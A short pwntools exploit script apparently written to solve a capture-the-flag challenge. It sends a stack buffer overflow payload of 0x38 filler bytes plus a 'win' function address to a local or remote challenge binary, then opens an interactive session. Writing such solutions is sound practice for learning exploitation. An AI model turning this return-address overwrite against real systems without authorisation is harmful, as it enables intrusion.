from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
# libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    # io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("0.cloud.chals.io", 20671)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


win = 0x0401307
io.sendlineafter("choice:\n", "5")
payload = b"t"*0x38+p64(win)
io.sendlineafter("commands:", payload)

io.interactive()


